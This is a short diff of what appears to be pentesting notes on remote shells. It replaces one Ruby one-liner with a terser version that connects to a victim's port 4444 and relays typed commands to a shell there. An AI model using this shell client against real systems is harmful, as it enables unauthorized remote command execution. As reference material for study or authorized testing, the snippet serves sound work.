@@ -9,7 +9,7 @@ Remote shell means s forward or reverse connection to the target system command-
 from terminal
 
 ```ruby
-ruby -rsocket -e's=TCPSocket.new("VictimIP",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end'
+ruby -rsocket -e's=TCPSocket.new("VictimIP",4444);loop{gets.chomp!;$_=="exit"?(s.close;exit):(s.puts$_);puts s.recv 0xFFFF}'
 ```
 
 since `192.168.0.15` is the victim IP
